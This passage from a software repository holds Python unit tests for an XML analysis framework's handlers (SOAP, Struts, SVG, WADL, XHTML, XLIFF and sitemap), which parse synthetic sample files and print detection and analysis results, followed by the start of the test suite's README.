                print(f"    - Average priority: {priority_dist.get('average_priority', 0):.2f}")
            
            success_count += 1
            print(f"  ✅ {sitemap_file.name} - SUCCESS")
            
        except Exception as e:
            print(f"  ❌ {sitemap_file.name} - ERROR: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 Sitemap Handler Test Results:")
    print(f"✅ Success: {success_count}/{total_count} ({success_count/total_count*100:.1f}%)")
    
    return success_count == total_count

if __name__ == "__main__":
    print("🧪 Sitemap Handler Test Suite")
    print("=" * 50)
    
    success = test_handler()
    
    if success:
        print("\n🎉 All tests passed! Sitemap handler is working correctly.")
        sys.exit(0)
    else:
        print("\n❌ Some tests failed. Please check the handler implementation.")
        sys.exit(1)
</file>

<file path="tests/unit/test_soap_handler.py">
#!/usr/bin/env python3
"""
Test script for SOAP Envelope Handler
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from handlers.soap_envelope_handler import SOAPEnvelopeHandler
import xml.etree.ElementTree as ET

def test_soap_handler():
    """Test SOAP handler with synthetic test files"""
    handler = SOAPEnvelopeHandler()
    
    # Test files
    test_files = [
        '../../sample_data/test_files_synthetic/small/soap/soap_request.xml',
        '../../sample_data/test_files_synthetic/small/soap/soap_response.xml', 
        '../../sample_data/test_files_synthetic/small/soap/soap_fault.xml',
        '../../sample_data/test_files_synthetic/small/soap/soap12_envelope.xml'
    ]
    
    print("🧪 Testing SOAP Envelope Handler")
    print("=" * 50)
    
    results = []
    
    for file_path in test_files:
        print(f"\n📄 Testing: {file_path}")
        
        try:
            # Parse XML
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':', 1)[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test detection
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"   Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test type detection
                doc_type = handler.detect_type(root, namespaces)
                print(f"   Type: {doc_type.type_name} (v{doc_type.version})")
                print(f"   Message type: {doc_type.metadata.get('message_type')}")
                print(f"   Has security: {doc_type.metadata.get('has_security')}")
                print(f"   Has addressing: {doc_type.metadata.get('has_addressing')}")
                
                # Test analysis
                analysis = handler.analyze(root, file_path)
                print(f"   Analysis complete - {len(analysis.key_findings)} findings")
                
                # Show key findings
                envelope_info = analysis.key_findings['envelope_info']
                print(f"   SOAP version: {envelope_info['version']}")
                print(f"   Message type: {envelope_info['message_type']}")
                
                security_info = analysis.key_findings['security']
                if security_info['has_security']:
                    print(f"   Security tokens: {len(security_info['security_tokens'])}")
                    if security_info['security_risks']:
                        print(f"   ⚠️  Security risks: {security_info['security_risks']}")
                
                addressing_info = analysis.key_findings['addressing']
                if addressing_info['has_addressing']:
                    print(f"   WS-Addressing: {addressing_info.get('action', 'N/A')}")
                
                fault_info = analysis.key_findings['faults']
                if fault_info['is_fault']:
                    fault_summary = fault_info['fault_summary']
                    print(f"   Fault: {fault_summary.get('code')} - {fault_summary.get('string')}")
                
                # Quality metrics
                quality = analysis.quality_metrics
                print(f"   Quality - Overall: {quality['overall']:.2f}, Security: {quality['security']:.2f}")
                
                results.append((file_path, True, doc_type.type_name))
            else:
                results.append((file_path, False, "Not handled"))
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
            results.append((file_path, False, f"Error: {e}"))
    
    # Summary
    print(f"\n{'='*50}")
    print("📊 SOAP Handler Test Results:")
    success_count = sum(1 for _, success, _ in results if success)
    print(f"Success rate: {success_count}/{len(results)} ({success_count/len(results)*100:.1f}%)")
    
    for file_path, success, type_name in results:
        status = "✅" if success else "❌"
        print(f"{status} {os.path.basename(file_path)}: {type_name}")
    
    return success_count == len(results)

if __name__ == "__main__":
    success = test_soap_handler()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_struts_handler.py">
#!/usr/bin/env python3
"""
Test Struts Configuration handler implementation
"""
import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_struts_handler():
    """Test Struts Configuration handler with sample files"""
    
    try:
        from handlers.struts_config_handler import StrutsConfigHandler
        print("✅ StrutsConfigHandler imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import StrutsConfigHandler: {e}")
        return False
    
    # Test files
    test_files = [
        "../../sample_data/test_files_synthetic/small/struts/simple_struts_config.xml",
        "../../sample_data/test_files_synthetic/small/struts/enterprise_struts_config.xml",
        "../../sample_data/test_files_synthetic/small/struts/legacy_struts_config.xml"
    ]
    
    handler = StrutsConfigHandler()
    success_count = 0
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing {test_file}")
        
        try:
            import xml.etree.ElementTree as ET
            
            # Parse the XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for prefix, uri in ET.iterparse(test_file, events=('start-ns',)):
                namespaces[prefix] = uri
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  - Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if not can_handle:
                print(f"❌ Handler cannot handle this file")
                continue
            
            # Test detect_type
            doc_type = handler.detect_type(root, namespaces)
            print(f"  - Document type: {doc_type.type_name}")
            print(f"  - Version: {doc_type.version}")
            print(f"  - Config type: {doc_type.metadata.get('config_type')}")
            print(f"  - Complexity: {doc_type.metadata.get('complexity')}")
            print(f"  - Action count: {doc_type.metadata.get('action_count')}")
            
            # Test analyze
            analysis = handler.analyze(root, test_file)
            print(f"  - Analysis type: {analysis.document_type}")
            
            # Check key findings
            findings = analysis.key_findings
            
            # Configuration info
            config_info = findings['configuration_info']
            print(f"  - Root element: {config_info['root_element']}")
            print(f"  - Main sections: {config_info['main_sections']}")
            
            # Action mappings
            actions = findings['action_mappings']
            print(f"  - Action count: {actions['action_count']}")
            print(f"  - Action types: {len(actions['action_types'])}")
            print(f"  - Scope usage: {actions['scope_usage']}")
            
            # Form beans
            forms = findings['form_beans']
            print(f"  - Form beans: {forms['bean_count']}")
            print(f"  - Dynamic forms: {forms['dynamic_forms']}")
            print(f"  - Form types: {len(forms['form_types'])}")
            
            # Global forwards
            forwards = findings['global_forwards']
            print(f"  - Global forwards: {forwards['forward_count']}")
            print(f"  - Redirects: {forwards['redirect_count']}")
            
            # Data sources
            data_sources = findings['data_sources']
            print(f"  - Data sources: {data_sources['source_count']}")
            print(f"  - Driver types: {list(data_sources['driver_types'].keys())}")
            
            # Plugins
            plugins = findings['plugins']
            print(f"  - Plugin count: {plugins['plugin_count']}")
            print(f"  - Tiles integration: {plugins['tiles_integration']}")
            print(f"  - Validator integration: {plugins['validator_integration']}")
            
            # Security analysis
            security = findings['security_analysis']
            print(f"  - Validation enabled: {security['validation_enabled']}")
            print(f"  - Potential vulnerabilities: {len(security['potential_vulnerabilities'])}")
            if security['potential_vulnerabilities']:
                print(f"    * {security['potential_vulnerabilities'][0]}")
            
            # Architecture metrics
            arch_metrics = findings['architecture_metrics']
            print(f"  - Complexity score: {arch_metrics['complexity_score']:.2f}")
            print(f"  - Maintainability score: {arch_metrics['maintainability_score']:.2f}")
            print(f"  - Action to form ratio: {arch_metrics['action_to_form_ratio']:.2f}")
            
            # Data inventory
            inventory = analysis.data_inventory
            print(f"  - Total actions: {inventory['total_actions']}")
            print(f"  - Form beans: {inventory['form_beans']}")
            print(f"  - Global forwards: {inventory['global_forwards']}")
            print(f"  - Data sources: {inventory['data_sources']}")
            print(f"  - Plugins: {inventory['plugins']}")
            
            # Quality metrics
            quality = analysis.quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            print(f"  - Design quality: {quality['design_quality']:.2f}")
            print(f"  - Security quality: {quality['security_quality']:.2f}")
            print(f"  - Maintainability: {quality['maintainability']:.2f}")
            
            # Structured data
            structured_data = analysis.structured_data
            print(f"  - App structure keys: {list(structured_data['application_structure'].keys())}")
            print(f"  - Action catalog count: {len(structured_data['action_catalog'])}")
            print(f"  - Form definitions: {len(structured_data['form_definitions'])}")
            
            # AI use cases (first 3)
            print(f"  - AI use cases ({len(analysis.ai_use_cases)}): {analysis.ai_use_cases[:3]}")
            
            print(f"✅ {test_file} processed successfully")
            success_count += 1
            
        except Exception as e:
            print(f"❌ Error processing {test_file}: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 Test Results: {success_count}/{len(test_files)} files processed successfully")
    return success_count == len(test_files)

if __name__ == "__main__":
    print("🧪 Struts Configuration Handler Test")
    print("=" * 50)
    
    success = test_struts_handler()
    
    if success:
        print("\n🎉 All Struts handler tests passed!")
        sys.exit(0)
    else:
        print("\n❌ Some Struts handler tests failed!")
        sys.exit(1)
</file>

<file path="tests/unit/test_svg_handler.py">
#!/usr/bin/env python3
"""
Test script for SVG Handler
Tests the SVG handler against synthetic test files.
"""

import sys
import os
import xml.etree.ElementTree as ET
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

# Test individual handler
try:
    from handlers.svg_handler import SVGHandler
    print("✅ SVGHandler imported successfully")
except ImportError as e:
    print(f"❌ Failed to import SVGHandler: {e}")
    sys.exit(1)

def test_handler():
    """Test the SVG handler with synthetic files"""
    
    handler = SVGHandler()
    test_files_dir = Path("../../sample_data/test_files_synthetic/small/svg")
    
    if not test_files_dir.exists():
        print(f"❌ Test files directory not found: {test_files_dir}")
        return False
    
    svg_files = list(test_files_dir.glob("*.svg"))
    if not svg_files:
        print(f"❌ No SVG files found in {test_files_dir}")
        return False
    
    print(f"\n🔍 Testing SVG handler with {len(svg_files)} files...")
    
    success_count = 0
    total_count = len(svg_files)
    
    for svg_file in svg_files:
        print(f"\n📄 Testing: {svg_file.name}")
        
        try:
            # Parse the XML file
            tree = ET.parse(svg_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':')[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  ✓ can_handle: {can_handle} (confidence: {confidence:.1f})")
            
            if not can_handle:
                print(f"  ❌ Handler cannot handle this file")
                continue
            
            # Test detect_type
            doc_type = handler.detect_type(root, namespaces)
            print(f"  ✓ detect_type: {doc_type.type_name} (v{doc_type.version})")
            
            # Test extract_key_data
            key_data = handler.extract_key_data(root)
            print(f"  ✓ extract_key_data: {len(key_data)} sections")
            
            # Test full analysis
            analysis = handler.analyze(root, str(svg_file))
            print(f"  ✓ analyze: {analysis.document_type}")
            print(f"    - Key findings: {len(analysis.key_findings)} sections")
            print(f"    - Recommendations: {len(analysis.recommendations)} items")
            print(f"    - AI use cases: {len(analysis.ai_use_cases)} cases")
            print(f"    - Data inventory: {sum(analysis.data_inventory.values())} items")
            print(f"    - Quality score: {analysis.quality_metrics.get('overall', 0):.2f}")
            
            # Test specific SVG analysis
            svg_info = analysis.key_findings.get('svg_info', {})
            print(f"    - SVG type: {svg_info.get('svg_type', 'Unknown')}")
            
            dimensions = analysis.key_findings.get('dimensions', {})
            print(f"    - Dimensions: {dimensions.get('width', 'auto')} x {dimensions.get('height', 'auto')}")
            
            accessibility = analysis.key_findings.get('accessibility', {})
            print(f"    - Accessibility score: {accessibility.get('accessibility_score', 0):.2f}")
            
            success_count += 1
            print(f"  ✅ {svg_file.name} - SUCCESS")
            
        except Exception as e:
            print(f"  ❌ {svg_file.name} - ERROR: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 SVG Handler Test Results:")
    print(f"✅ Success: {success_count}/{total_count} ({success_count/total_count*100:.1f}%)")
    
    return success_count == total_count

if __name__ == "__main__":
    print("🧪 SVG Handler Test Suite")
    print("=" * 50)
    
    success = test_handler()
    
    if success:
        print("\n🎉 All tests passed! SVG handler is working correctly.")
        sys.exit(0)
    else:
        print("\n❌ Some tests failed. Please check the handler implementation.")
        sys.exit(1)
</file>

<file path="tests/unit/test_wadl_handler.py">
#!/usr/bin/env python3
"""
Test WADL handler implementation
"""
import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_wadl_handler():
    """Test WADL handler with sample files"""
    
    try:
        from handlers.wadl_handler import WADLHandler
        print("✅ WADLHandler imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import WADLHandler: {e}")
        return False
    
    # Test files
    test_files = [
        "../../sample_data/test_files_synthetic/small/wadl/simple_api.wadl",
        "../../sample_data/test_files_synthetic/small/wadl/complex_api.wadl"
    ]
    
    handler = WADLHandler()
    success_count = 0
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing {test_file}")
        
        try:
            import xml.etree.ElementTree as ET
            
            # Parse the XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for prefix, uri in ET.iterparse(test_file, events=('start-ns',)):
                namespaces[prefix] = uri
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  - Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if not can_handle:
                print(f"❌ Handler cannot handle this file")
                continue
            
            # Test detect_type
            doc_type = handler.detect_type(root, namespaces)
            print(f"  - Document type: {doc_type.type_name}")
            print(f"  - Version: {doc_type.version}")
            print(f"  - API type: {doc_type.metadata.get('api_type')}")
            print(f"  - Methods: {doc_type.metadata.get('methods')}")
            
            # Test analyze
            analysis = handler.analyze(root, test_file)
            print(f"  - Analysis type: {analysis.document_type}")
            
            # Check key findings
            findings = analysis.key_findings
            
            # Application info
            app_info = findings['application_info']
            print(f"  - Base URI: {app_info['base_uri']}")
            print(f"  - Title: {app_info['title']}")
            
            # Resources
            resources = findings['resources']
            print(f"  - Resource count: {resources['resource_count']}")
            print(f"  - Base paths: {resources['base_paths'][:3]}")
            
            # Methods
            methods = findings['methods']
            print(f"  - Method count: {methods['method_count']}")
            print(f"  - Method distribution: {methods['method_distribution']}")
            
            # Parameters
            parameters = findings['parameters']
            print(f"  - Parameter count: {parameters['parameter_count']}")
            print(f"  - Required params: {parameters['required_params']}")
            print(f"  - Parameter styles: {list(parameters['parameter_styles'].keys())}")
            
            # Representations
            representations = findings['representations']
            print(f"  - Representation count: {representations['representation_count']}")
            print(f"  - Media types: {representations['media_types']}")
            
            # Grammars
            grammars = findings['grammars']
            print(f"  - Has grammars: {grammars['has_grammars']}")
            print(f"  - Schema count: {grammars['schemas']}")
            
            # Documentation
            documentation = findings['documentation']
            print(f"  - Documentation coverage: {documentation['coverage_score']:.2f}")
            
            # Security
            security = findings['security']
            print(f"  - Has authentication: {security['has_authentication']}")
            print(f"  - HTTPS required: {security['https_required']}")
            print(f"  - Auth methods: {security['auth_methods'][:3]}")
            
            # API metrics
            api_metrics = findings['api_metrics']
            print(f"  - Complexity score: {api_metrics['complexity_score']:.2f}")
            print(f"  - CRUD completeness: {api_metrics['crud_completeness']:.2f}")
            
            # Data inventory
            inventory = analysis.data_inventory
            print(f"  - Total resources: {inventory['total_resources']}")
            print(f"  - Total methods: {inventory['total_methods']}")
            print(f"  - Total parameters: {inventory['total_parameters']}")
            
            # Quality metrics
            quality = analysis.quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            print(f"  - Design quality: {quality['design_quality']:.2f}")
            print(f"  - Documentation quality: {quality['documentation_quality']:.2f}")
            
            # Structured data
            structured_data = analysis.structured_data
            print(f"  - API spec keys: {list(structured_data['api_specification'].keys())}")
            print(f"  - Endpoint count: {len(structured_data['endpoint_catalog'])}")
            
            # AI use cases (first 3)
            print(f"  - AI use cases ({len(analysis.ai_use_cases)}): {analysis.ai_use_cases[:3]}")
            
            print(f"✅ {test_file} processed successfully")
            success_count += 1
            
        except Exception as e:
            print(f"❌ Error processing {test_file}: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 Test Results: {success_count}/{len(test_files)} files processed successfully")
    return success_count == len(test_files)

if __name__ == "__main__":
    print("🧪 WADL Handler Test")
    print("=" * 50)
    
    success = test_wadl_handler()
    
    if success:
        print("\n🎉 All WADL handler tests passed!")
        sys.exit(0)
    else:
        print("\n❌ Some WADL handler tests failed!")
        sys.exit(1)
</file>

<file path="tests/unit/test_xhtml_handler.py">
#!/usr/bin/env python3
"""
Test XHTML handler implementation
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_xhtml_handler_import():
    """Test importing the XHTML handler"""
    try:
        from handlers.xhtml_handler import XHTMLHandler
        print("✅ XHTMLHandler imported successfully")
        return True
    except ImportError as e:
        print(f"❌ Failed to import XHTMLHandler: {e}")
        return False

def test_xhtml_handler_instantiation():
    """Test creating XHTML handler instance"""
    try:
        from handlers.xhtml_handler import XHTMLHandler
        handler = XHTMLHandler()
        print("✅ XHTMLHandler instantiated successfully")
        return handler
    except Exception as e:
        print(f"❌ Failed to instantiate XHTMLHandler: {e}")
        return None

def test_xhtml_files():
    """Test XHTML handler with sample files"""
    from handlers.xhtml_handler import XHTMLHandler
    import xml.etree.ElementTree as ET
    
    handler = XHTMLHandler()
    test_files = [
        "../../sample_data/test_files_synthetic/small/xhtml/simple_page.xhtml",
        "../../sample_data/test_files_synthetic/small/xhtml/form_page.xhtml", 
        "../../sample_data/test_files_synthetic/small/xhtml/semantic_article.xhtml",
        "../../sample_data/test_files_synthetic/small/xhtml/basic_webpage.xhtml"
    ]
    
    results = []
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
            
        print(f"\n🔍 Testing {test_file}")
        
        try:
            # Parse XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for event, elem in ET.iterparse(test_file, events=['start-ns']):
                if event == 'start-ns':
                    prefix, uri = elem
                    namespaces[prefix or 'default'] = uri
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  - can_handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test detect_type
                doc_type = handler.detect_type(root, namespaces)
                print(f"  - Document type: {doc_type.type_name}")
                print(f"  - Version: {doc_type.version}")
                print(f"  - Document subtype: {doc_type.metadata.get('document_type', 'unknown')}")
                print(f"  - Confidence: {doc_type.confidence:.2f}")
                
                # Test analyze
                analysis = handler.analyze(root, test_file)
                print(f"  - Analysis type: {analysis.document_type}")
                print(f"  - Key findings keys: {list(analysis.key_findings.keys())}")
                print(f"  - Data inventory: {analysis.data_inventory}")
                print(f"  - AI use cases: {len(analysis.ai_use_cases)}")
                
                # Show specific findings
                findings = analysis.key_findings
                
                # Structure
                structure = findings['document_structure']
                print(f"  - Total elements: {structure['total_elements']}")
                print(f"  - Max depth: {structure['max_depth']}")
                
                # Content
                content = findings['content_analysis']
                print(f"  - Headings: {sum(content['headings'].values()) if content['headings'] else 0}")
                print(f"  - Paragraphs: {content['paragraphs']}")
                print(f"  - Language: {content.get('language', 'unknown')}")
                
                # Semantic elements
                semantic = findings['semantic_elements']
                print(f"  - Semantic elements: {semantic['total_semantic']}")
                
                # Metadata
                metadata = findings['metadata']
                if metadata['title']:
                    print(f"  - Title: {metadata['title'][:50]}...")
                
                # Accessibility
                accessibility = findings['accessibility']
                if accessibility['alt_texts'] + accessibility['missing_alt_texts'] > 0:
                    total_images = accessibility['alt_texts'] + accessibility['missing_alt_texts']
                    alt_ratio = accessibility['alt_texts'] / total_images * 100
                    print(f"  - Image accessibility: {alt_ratio:.0f}% have alt text")
                
                # Forms
                forms = findings['forms']
                if forms['form_count'] > 0:
                    print(f"  - Forms: {forms['form_count']} with {forms['total_inputs']} inputs")
                
                # Links and media
                links_media = findings['links_and_media']
                print(f"  - Links: {links_media['total_links']} ({links_media['external_links']} external)")
                print(f"  - Images: {links_media['images']}")
                
                print(f"  - Quality metrics: {analysis.quality_metrics}")
                
                # Test extract_key_data
                key_data = handler.extract_key_data(root)
                print(f"  - Key data keys: {list(key_data.keys())}")
                
                results.append({
                    'file': test_file,
                    'success': True,
                    'confidence': confidence,
                    'total_elements': structure['total_elements'],
                    'semantic_elements': semantic['total_semantic'],
                    'forms': forms['form_count'],
                    'links': links_media['total_links'],
                    'document_subtype': doc_type.metadata.get('document_type'),
                    'language': content.get('language')
                })
                print("  ✅ Test passed")
            else:
                results.append({
                    'file': test_file,
                    'success': False,
                    'reason': 'Handler rejected file'
                })
                print("  ❌ Handler cannot handle this file")
                
        except Exception as e:
            print(f"  ❌ Test failed: {e}")
            results.append({
                'file': test_file,
                'success': False,
                'reason': str(e)
            })
            import traceback
            traceback.print_exc()
    
    return results

def main():
    print("🧪 XHTML Handler Test Suite")
    print("=" * 50)
    
    # Test import
    if not test_xhtml_handler_import():
        return False
    
    # Test instantiation
    handler = test_xhtml_handler_instantiation()
    if not handler:
        return False
    
    # Test with files
    results = test_xhtml_files()
    
    # Summary
    print(f"\n📊 Test Results Summary")
    print("=" * 30)
    
    successful = [r for r in results if r['success']]
    failed = [r for r in results if not r['success']]
    
    print(f"✅ Successful: {len(successful)}/{len(results)}")
    print(f"❌ Failed: {len(failed)}/{len(results)}")
    
    if successful:
        avg_confidence = sum(r['confidence'] for r in successful) / len(successful)
        print(f"📈 Average confidence: {avg_confidence:.2f}")
        
        total_elements = sum(r.get('total_elements', 0) for r in successful)
        total_semantic = sum(r.get('semantic_elements', 0) for r in successful)
        total_forms = sum(r.get('forms', 0) for r in successful)
        total_links = sum(r.get('links', 0) for r in successful)
        
        print(f"🔖 Total elements analyzed: {total_elements}")
        print(f"🎯 Total semantic elements: {total_semantic}")
        print(f"📝 Total forms detected: {total_forms}")
        print(f"🔗 Total links detected: {total_links}")
        
        print(f"\n📋 Document Types Detected:")
        doc_types = {}
        for result in successful:
            dt = result.get('document_subtype', 'unknown')
            doc_types[dt] = doc_types.get(dt, 0) + 1
        for dt, count in doc_types.items():
            print(f"  - {dt}: {count}")
        
        print(f"\n🌍 Languages Detected:")
        languages = {}
        for result in successful:
            lang = result.get('language', 'unknown')
            languages[lang] = languages.get(lang, 0) + 1
        for lang, count in languages.items():
            print(f"  - {lang or 'unknown'}: {count}")
    
    if failed:
        print("\n❌ Failed tests:")
        for result in failed:
            print(f"  - {Path(result['file']).name}: {result['reason']}")
    
    success_rate = len(successful) / len(results) * 100 if results else 0
    print(f"\n🎯 Success rate: {success_rate:.1f}%")
    
    return success_rate == 100.0

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_xliff_handler.py">
#!/usr/bin/env python3
"""
Test XLIFF handler implementation
"""
import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_xliff_handler():
    """Test XLIFF handler with sample files"""
    
    try:
        from handlers.xliff_handler import XLIFFHandler
        print("✅ XLIFFHandler imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XLIFFHandler: {e}")
        return False
    
    # Test files
    test_files = [
        "../../sample_data/test_files_synthetic/small/xliff/simple_translation.xlf",
        "../../sample_data/test_files_synthetic/small/xliff/multilingual_project.xlf",
        "../../sample_data/test_files_synthetic/small/xliff/software_ui_translation.xlf"
    ]
    
    handler = XLIFFHandler()
    success_count = 0
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing {test_file}")
        
        try:
            import xml.etree.ElementTree as ET
            
            # Parse the XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for prefix, uri in ET.iterparse(test_file, events=('start-ns',)):
                namespaces[prefix] = uri
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  - Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if not can_handle:
                print(f"❌ Handler cannot handle this file")
                continue
            
            # Test detect_type
            doc_type = handler.detect_type(root, namespaces)
            print(f"  - Document type: {doc_type.type_name}")
            print(f"  - Version: {doc_type.version}")
            print(f"  - Document subtype: {doc_type.metadata.get('document_type')}")
            print(f"  - Complexity: {doc_type.metadata.get('complexity')}")
            print(f"  - Workflow state: {doc_type.metadata.get('workflow_state')}")
            print(f"  - Translation units: {doc_type.metadata.get('translation_units')}")
            print(f"  - File count: {doc_type.metadata.get('file_count')}")
            
            # Test analyze
            analysis = handler.analyze(root, test_file)
            print(f"  - Analysis type: {analysis.document_type}")
            
            # Check key findings
            findings = analysis.key_findings
            
            # File info
            file_info = findings['file_info']
            print(f"  - XLIFF version: {file_info['version']}")
            print(f"  - Tool name: {file_info['tool_name']}")
            
            # Translation files
            files = findings['translation_files']
            print(f"  - File count: {files['file_count']}")
            print(f"  - Source languages: {files['source_languages']}")
            print(f"  - Target languages: {files['target_languages']}")
            
            # Translation units
            units = findings['translation_units']
            print(f"  - Translation units: {units['unit_count']}")
            print(f"  - Approved: {units['approved_count']}")
            print(f"  - Locked: {units['locked_count']}")
            print(f"  - Empty targets: {units['empty_targets']}")
            print(f"  - States: {list(units['states'].keys())}")
            
            # Languages
            languages = findings['languages']
            print(f"  - Source language: {languages['source_language']}")
            print(f"  - Target languages: {languages['target_languages']}")
            print(f"  - Language pairs: {languages['language_pairs']}")
            print(f"  - Multilingual: {languages['multilingual']}")
            
            # Workflow state
            workflow = findings['workflow_state']
            print(f"  - Completion: {workflow['completion_percentage']:.1f}%")
            print(f"  - Translated: {workflow['translated_count']}")
            print(f"  - Needs work: {workflow['needs_work_count']}")
            
            # Translation memory
            tm = findings['translation_memory']
            print(f"  - Has TM matches: {tm['has_tm_matches']}")
            print(f"  - Exact matches: {tm['exact_matches']}")
            print(f"  - Fuzzy matches: {tm['fuzzy_matches']}")
            
            # Notes and comments
            notes = findings['notes_comments']
            print(f"  - Note count: {notes['note_count']}")
            print(f"  - Translator notes: {notes['translator_notes']}")
            print(f"  - Reviewer notes: {notes['reviewer_notes']}")
            
            # Quality metrics
            quality_metrics = findings['quality_metrics']
            print(f"  - Completion rate: {quality_metrics['completion_rate']:.1f}%")
            print(f"  - Approval rate: {quality_metrics['approval_rate']:.1f}%")
            print(f"  - Empty target rate: {quality_metrics['empty_target_rate']:.1f}%")
            
            # Localization metadata
            l10n = findings['localization_metadata']
            print(f"  - Data types: {l10n['datatypes']}")
            print(f"  - Original formats: {l10n['original_formats']}")
            print(f"  - Phase count: {len(l10n['phase_info'])}")
            
            # Translation tools
            tools = findings['translation_tools']
            print(f"  - Primary tool: {tools['primary_tool']}")
            print(f"  - Tool count: {tools['tool_count']}")
            
            # Data inventory
            inventory = analysis.data_inventory
            print(f"  - Total files: {inventory['total_files']}")
            print(f"  - Translation units: {inventory['translation_units']}")
            print(f"  - Source language: {inventory['source_language']}")
            print(f"  - Target languages: {inventory['target_languages']}")
            print(f"  - Translated units: {inventory['translated_units']}")
            print(f"  - Completion rate: {inventory['completion_rate']:.1f}%")
            
            # Quality assessment
            quality = analysis.quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            print(f"  - Completeness: {quality['completeness']:.2f}")
            print(f"  - Consistency: {quality['consistency']:.2f}")
            print(f"  - Workflow health: {quality['workflow_health']:.2f}")
            print(f"  - Localization readiness: {quality['localization_readiness']:.2f}")
            
            # Structured data
            structured_data = analysis.structured_data
            print(f"  - Project metadata keys: {list(structured_data['translation_project'].keys())}")
            print(f"  - Translation catalog count: {len(structured_data['translation_catalog'])}")
            print(f"  - Language pairs: {len(structured_data['language_pairs'])}")
            
            # AI use cases (first 3)
            print(f"  - AI use cases ({len(analysis.ai_use_cases)}): {analysis.ai_use_cases[:3]}")
            
            print(f"✅ {test_file} processed successfully")
            success_count += 1
            
        except Exception as e:
            print(f"❌ Error processing {test_file}: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 Test Results: {success_count}/{len(test_files)} files processed successfully")
    return success_count == len(test_files)

if __name__ == "__main__":
    print("🧪 XLIFF Handler Test")
    print("=" * 50)
    
    success = test_xliff_handler()
    
    if success:
        print("\n🎉 All XLIFF handler tests passed!")
        sys.exit(0)
    else:
        print("\n❌ Some XLIFF handler tests failed!")
        sys.exit(1)
</file>

<file path="tests/__init__.py">
"""
XML Analysis Framework Test Suite

This directory contains all tests for the XML analysis framework:

- unit/: Individual handler unit tests
- integration/: Handler integration tests with the main framework
- comprehensive/: Full system tests and performance analysis

Test Categories:
- Handler-specific tests: test_*_handler.py
- Integration tests: test_*_integration.py  
- Comprehensive tests: test_*_comprehensive.py
- Framework tests: test_framework.py, test_all_sample_data.py
"""

__version__ = "1.0.0"
</file>

<file path="tests/README.md">
# XML Analysis Framework Test Suite

This directory contains all tests for the XML analysis framework, organized into a clean structure for easy maintenance and execution.

## Directory Structure

```
tests/
├── __init__.py                 # Test package initialization
├── README.md                   # This file
├── run_all_tests.py           # Comprehensive test runner
├── test_framework.py          # Framework-level tests
├── test_setup.py              # Setup and configuration tests
├── test_existing_handlers.py  # Tests for existing handlers
├── test_migration_progress.py # Migration progress tests
│
├── debug/                     # Debug and troubleshooting scripts
│   ├── debug_analyzer_issue.py
│   └── debug_hierarchical_chunking.py
│
├── manual/                    # Manual testing and analysis scripts
│   ├── test_end_to_end_workflow.py      # ⭐ Main comprehensive test
│   ├── test_all_chunking.py             # Chunking validation
│   ├── test_servicenow_analysis.py      # ServiceNow handler testing
│   └── analyze_test_results.py          # Test result analysis
│
├── unit/                      # Individual handler unit tests
│   ├── __init__.py
│   ├── test_ant_handler.py
│   ├── test_soap_handler.py
│   ├── test_saml_handler.py
